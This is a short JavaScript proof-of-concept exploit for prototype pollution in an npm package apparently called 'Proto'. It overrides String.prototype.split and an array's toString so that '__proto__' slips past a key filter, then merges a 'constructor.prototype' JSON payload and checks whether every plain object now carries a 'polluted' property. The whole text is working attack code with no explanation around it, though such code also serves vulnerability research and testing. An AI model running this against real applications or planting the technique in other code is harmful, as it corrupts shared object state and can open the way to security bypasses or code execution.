var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
const proto = require('Proto');
let payload = '{"constructor.prototype": {"polluted":"yes"}}';
console.log({}.polluted);
proto.merge({}, JSON.parse(payload));
console.log({}.polluted);